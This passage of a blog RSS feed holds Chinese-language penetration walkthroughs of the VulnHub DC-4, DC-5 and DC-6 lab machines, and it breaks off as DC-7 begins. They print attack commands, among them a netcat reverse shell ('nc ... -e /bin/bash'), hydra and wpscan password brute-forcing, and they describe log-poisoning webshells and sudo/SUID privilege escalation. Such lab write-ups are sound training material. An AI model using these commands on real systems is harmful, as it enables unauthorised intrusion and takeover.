      <description>&lt;h1 id=&#34;dc-4渗透笔记&#34;&gt;DC-4渗透笔记&lt;/h1&gt;&#xA;&lt;h3 id=&#34;信息搜集&#34;&gt;信息搜集&lt;/h3&gt;&#xA;&lt;h4 id=&#34;探测ip&#34;&gt;探测IP&lt;/h4&gt;&#xA;&lt;p&gt;nmap扫c段：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sP 192.168.111.0/24&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155211131-743337984.png&#34; alt=&#34;image-20240718155211151&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以确定IP为192.168.111.191&lt;/p&gt;&#xA;&lt;h4 id=&#34;端口探测&#34;&gt;端口探测&lt;/h4&gt;&#xA;&lt;p&gt;nmap探测端口：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -p- 192.168.111.191&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155313353-376482775.png&#34; alt=&#34;image-20240718155313518&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可见开启了两个端口：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;22端口，ssh服务&lt;/li&gt;&#xA;&lt;li&gt;80端口，http服务&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;网页信息搜集&#34;&gt;网页信息搜集&lt;/h4&gt;&#xA;&lt;p&gt;老规矩，先看看80端口的网页：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155256484-325733961.png&#34; alt=&#34;image-20240718155256688&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;一个登录框而且不是通用的CMS，那么思路就放在登录框对抗上&lt;/p&gt;&#xA;&lt;p&gt;先扫目录看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155425009-1387193229.png&#34; alt=&#34;image-20240718155424959&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;确实没啥利用点，直接开始我们的登录口对抗&lt;/p&gt;&#xA;&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;&#xA;&lt;h4 id=&#34;登录口对抗&#34;&gt;登录口对抗&lt;/h4&gt;&#xA;&lt;p&gt;这里首先考虑弱口令和sql注入，先抓个包爆破一下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718152720761-2037406251.png&#34; alt=&#34;image-20240718152720235&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;用户名用admin试试，密码跑一下字典&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718152820340-694142984.png&#34; alt=&#34;image-20240718152820141&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这不就爆出来了，密码为happy，直接登录：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155531007-1243704515.png&#34; alt=&#34;image-20240718155531165&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;顺利进入后台，这里有个执行命令的选项，我们点run试试：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155613875-1716370423.png&#34; alt=&#34;image-20240718155614070&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里是执行了&lt;code&gt;ls -l&lt;/code&gt;，抓包看看命令是否可控呢：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718160133715-914601756.png&#34; alt=&#34;image-20240718160133556&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;命令可控，将命令改为whoami，成功执行，思路对了，那么接下来肯定想到反弹shell了&lt;/p&gt;&#xA;&lt;h4 id=&#34;命令执行反弹shell&#34;&gt;命令执行反弹shell&lt;/h4&gt;&#xA;&lt;p&gt;kali上开启监听：&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718160426929-1821824375.png&#34; alt=&#34;image-20240718160426968&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;接下来执行反弹shell的命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc 192.168.111.132 &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -e /bin/bash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意参数的空格改为+号：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718160719286-2062335091.png&#34; alt=&#34;image-20240718160719599&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;连接成功：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718160808391-1494982083.png&#34; alt=&#34;image-20240718160808574&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;太丑了，python获取一个pty：&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718161033558-132948239.png&#34; alt=&#34;image-20240718161033903&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;舒服了，接下来应该就是权限提升了&lt;/p&gt;&#xA;&lt;h3 id=&#34;权限提升&#34;&gt;权限提升&lt;/h3&gt;&#xA;&lt;h4 id=&#34;hydra爆破ssh&#34;&gt;hydra爆破ssh&lt;/h4&gt;&#xA;&lt;p&gt;看看有没有什么可疑的文件比如sudo，suid之类的：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718162934940-395740859.png&#34; alt=&#34;image-20240718162934835&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;没有太多收获，去家目录看看呢：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718163432813-674293905.png&#34; alt=&#34;image-20240718163432974&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可见有三个用户，而jim用户的文件有点可疑，仔细看看：&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718164215250-478892187.png&#34; alt=&#34;image-20240718164215415&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;mbox应该是个邮箱，但权限不够看不了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718163920967-731804546.png&#34; alt=&#34;image-20240718163921124&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;test.sh是个普通脚本文件，但backups文件夹中有旧密码备份，很容易想到爆破ssh了，用kali自带的hydra一下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hydra -l jim -P ./pass.txt 192.168.111.191 ssh&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718164848649-1273341394.png&#34; alt=&#34;image-20240718164848722&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>DC-5渗透笔记</title>
      <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;dc-5渗透笔记&#34;&gt;DC-5渗透笔记&lt;/h1&gt;&#xA;&lt;h3 id=&#34;信息搜集&#34;&gt;信息搜集&lt;/h3&gt;&#xA;&lt;p&gt;经过前面几个靶机的练习，已经轻车熟路了：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719165440506-1265514191.png&#34; alt=&#34;image-20240719165439053&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;信息搜集一条龙，可知：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;IP为192.168.111.145&lt;/li&gt;&#xA;&lt;li&gt;开放了80、111、47890三个端口&lt;/li&gt;&#xA;&lt;li&gt;目录扫描到一点点可访问路径&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;接下来看看web服务：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719170108696-1805610347.png&#34; alt=&#34;image-20240719170107740&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;并不是什么通用的cms，那么就只有先尝试从功能点入手了，翻一翻这里有哪些功能&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719170558580-1764687279.png&#34; alt=&#34;image-20240719170557993&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们发现contact功能点有留言功能，写点东西试试&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719170537599-1176214578.png&#34; alt=&#34;image-20240719170536916&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;提交后发现跳转了，并且网页底部的&lt;strong&gt;Copyright&lt;/strong&gt;值从2019变成了2017&lt;/p&gt;&#xA;&lt;p&gt;联想到我们在用dirsearch的时候，扫描到一个footer.php，看名字应该也是一个关于网页底部内容的文件，访问试试：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719170914869-1286745330.png&#34; alt=&#34;image-20240719170914419&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;还真是，而且如果我们刷新，年份还会有变化：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719171022097-293216287.png&#34; alt=&#34;image-20240719171021710&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719170956668-1833244195.png&#34; alt=&#34;image-20240719170956308&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719171006880-1474555334.png&#34; alt=&#34;image-20240719171006472&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;如果有搭建博客经历的话，其实就能想到，这个footer.php应该是被包含在了thankyou.php里的，我们可以尝试以此为立足点展开利用&lt;/p&gt;&#xA;&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;&#xA;&lt;h4 id=&#34;文件包含漏洞&#34;&gt;文件包含漏洞&lt;/h4&gt;&#xA;&lt;p&gt;如果这里存在文件包含，我们可以用fuzz一下可能用于包含的参数&lt;/p&gt;&#xA;&lt;p&gt;先试试get方法：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719172220731-1651889598.png&#34; alt=&#34;image-20240719172220260&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;fuzz一手发现参数为file&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719172850469-1047640388.png&#34; alt=&#34;image-20240719172850016&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;再验证一下，包含&lt;code&gt;/etc/passwd&lt;/code&gt;试试：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719173015855-991786372.png&#34; alt=&#34;image-20240719173015121&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;确实是文件包含，那么这里想要getshell就有两种思路：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;打php_filter_chain，但是filter链很长，会被GET传参限制，所以只能执行简单命令，但确实可以实现RCE：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719173903438-1359853957.png&#34; alt=&#34;image-20240719173902420&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;包含日志文件写马，只要知道日志文件路径就能写，而我们已知中间件为Nginx，路径通常为&lt;code&gt;/var/log/nginx/access.log&lt;/code&gt;，可以尝试一手&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;包含日志文件写马&#34;&gt;包含日志文件写马&lt;/h4&gt;&#xA;&lt;p&gt;ok直接抓包写一个phpinfo试试：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719174939789-654701500.png&#34; alt=&#34;image-20240719174938855&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;包含日志文件看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719174927455-451503483.png&#34; alt=&#34;image-20240719174926256&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;出现了phpinfo界面，成功&lt;/p&gt;&#xA;&lt;p&gt;接下来可以写个一句话木马：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719174348619-288920858.png&#34; alt=&#34;image-20240719174347892&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;蚁剑连接试试：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719175131031-542488280.png&#34; alt=&#34;image-20240719175130432&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;连上了，接下来就是反弹shell了&lt;/p&gt;&#xA;&lt;h4 id=&#34;获取交互式shell&#34;&gt;获取交互式shell&lt;/h4&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719175359635-605633148.png&#34; alt=&#34;image-20240719175359080&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;nc反弹shell&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719175451266-2057744534.png&#34; alt=&#34;image-20240719175450445&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;成功连上了&lt;/p&gt;&#xA;&lt;p&gt;依然是python获取pty：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719175704574-238664822.png&#34; alt=&#34;image-20240719175703397&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们当前的权限是www-data，接下来又是权限提升了&lt;/p&gt;&#xA;&lt;h3 id=&#34;权限提升&#34;&gt;权限提升&lt;/h3&gt;&#xA;&lt;p&gt;先看看SUID权限的文件有没有什么可以利用的&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719180616020-543896218.png&#34; alt=&#34;image-20240719180614279&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;还真有一个Screen 4.5.0的漏洞可用于权限提升&lt;/p&gt;&#xA;&lt;p&gt;将脚本复制一份放到web目录：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719181226450-1013409552.png&#34; alt=&#34;image-20240719181225427&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;看看脚本内容：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719181928460-1039659089.png&#34; alt=&#34;image-20240719181927338&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;如图，脚本内容分三段，前两段会构造出单独的脚本文件，还有一段会执行利用命令&lt;/p&gt;&#xA;&lt;p&gt;接下来打开http服务准备上传文件：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 -m SimpleHTTPServer &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719182550833-1953735478.png&#34; alt=&#34;image-20240719182549940&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;在靶机上使用wget下载脚本文件到/tmp/目录，再赋予执行权限，即可运行提权脚本：&lt;/p&gt;</description>
    </item>
    <item>
      <title>DC-6渗透笔记</title>
      <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-6%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-6%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;dc-6渗透笔记&#34;&gt;DC-6渗透笔记&lt;/h1&gt;&#xA;&lt;p&gt;靶机给了两个提示，一个是插件，一个是暴力破解&lt;/p&gt;&#xA;&lt;h3 id=&#34;信息收集&#34;&gt;信息收集&lt;/h3&gt;&#xA;&lt;h4 id=&#34;ip探测&#34;&gt;IP探测&lt;/h4&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721161713724-1443644218.png&#34; alt=&#34;image-20240721161713732&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;IP为192.168.111.142&lt;/p&gt;&#xA;&lt;h4 id=&#34;端口探测&#34;&gt;端口探测&lt;/h4&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721161759490-980666497.png&#34; alt=&#34;image-20240721161759582&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可知开放了22端口和80端口&lt;/p&gt;&#xA;&lt;h4 id=&#34;网页信息搜集&#34;&gt;网页信息搜集&lt;/h4&gt;&#xA;&lt;p&gt;访问网页发现无法访问&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721161852598-2145947093.png&#34; alt=&#34;image-20240721161852895&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现url被解析成wordy，和DC-2类似，在hosts文件添加解析再次访问&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721162336416-2066819475.png&#34; alt=&#34;image-20240721162335634&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;主要信息就是CMS为wordpress 5.1.1&lt;/p&gt;&#xA;&lt;p&gt;先扫一下目录：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721162725859-1879727514.png&#34; alt=&#34;image-20240721162725787&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以找到后台登陆点&lt;/p&gt;&#xA;&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;&#xA;&lt;h4 id=&#34;暴力破解登陆后台&#34;&gt;暴力破解登陆后台&lt;/h4&gt;&#xA;&lt;p&gt;根据提示可以想到这里应该是要暴力破解一下后台密码&lt;/p&gt;&#xA;&lt;p&gt;先用wpscan扫扫&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wpscan --url http://wordy --enumerate u&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721164142085-134221907.png&#34; alt=&#34;image-20240721164141907&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;枚举出几个用户，先保存在文件里&lt;/p&gt;&#xA;&lt;p&gt;我们直接用rockyou.txt爆破一下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wpscan --url http://wordy -P /usr/share/wordlists/rockyou.txt -U wpname.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;字典很大，耐心等待&lt;/p&gt;&#xA;&lt;p&gt;最后得到mark的密码：helpdesk01&lt;/p&gt;&#xA;&lt;p&gt;即可登录进入后台&lt;/p&gt;&#xA;&lt;h4 id=&#34;后台getshell&#34;&gt;后台getshell&lt;/h4&gt;&#xA;&lt;p&gt;后台发现这个插件似乎使用命令执行，lookup抓包看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721171534157-501957967.png&#34; alt=&#34;image-20240721171534203&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;还真是，那就直接反弹shell：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721172316726-1095117511.png&#34; alt=&#34;image-20240721172316636&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;ok已经getshell，再拿个pty：&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721172426430-1201678872.png&#34; alt=&#34;image-20240721172426833&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;接下来就是提权了&lt;/p&gt;&#xA;&lt;h3 id=&#34;权限提升&#34;&gt;权限提升&lt;/h3&gt;&#xA;&lt;p&gt;在stuff目录下找到了一个任务清单：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721173609092-485318415.png&#34; alt=&#34;image-20240721173609299&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现了graham的密码：GSo7isUM1D4&lt;/p&gt;&#xA;&lt;p&gt;直接登录：&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721173717500-1386144627.png&#34; alt=&#34;image-20240721173717624&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;看看sudo权限：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721173904365-754218415.png&#34; alt=&#34;image-20240721173904325&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现一个免密sudo（身份为jens）的脚本，看看内容和权限：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721174114881-507677389.png&#34; alt=&#34;image-20240721174115145&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;jens用户可读可写可执行，很明显的sudo脚本篡改提权，直接追加写入内容，再以jens用户执行，可以拿到jens身份的bash（这里尝试的时候，提示权限不足，应该是切换用户时的问题，于是换成使用ssh登录graham用户）：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721180642686-1067631521.png&#34; alt=&#34;image-20240721180642892&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;再看看jens的sudo权限：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721181043587-788312517.png&#34; alt=&#34;image-20240721181043514&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现nmap可以免密sudo执行，而nmap可以执行脚本文件，也可以实现权限提升：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721181740155-160856389.png&#34; alt=&#34;image-20240721181740017&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;成功拿到root权限&lt;/p&gt;&#xA;&lt;p&gt;在/root目录拿到flag：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240721182123336-1994521683.png&#34; alt=&#34;image-20240721182123390&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>DC-7渗透笔记</title>
      <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-7%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-7%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;dc-7渗透笔记&#34;&gt;DC-7渗透笔记&lt;/h1&gt;&#xA;&lt;p&gt;靶场作者说明：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722153524705-550943464.png&#34; alt=&#34;image-20240722153524012&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;信息搜集&#34;&gt;信息搜集&lt;/h3&gt;&#xA;&lt;p&gt;IP、端口、目录一条龙：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722153330313-1941059765.png&#34; alt=&#34;image-20240722153329484&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可知：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;IP为192.168.111.145&lt;/li&gt;&#xA;&lt;li&gt;开放22、80端口&lt;/li&gt;&#xA;&lt;li&gt;目录毛都没扫出&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;看看web网页：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722152804604-1344200974.png&#34; alt=&#34;image-20240722152803919&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可知cms是Drupal 8&lt;/p&gt;&#xA;&lt;h3 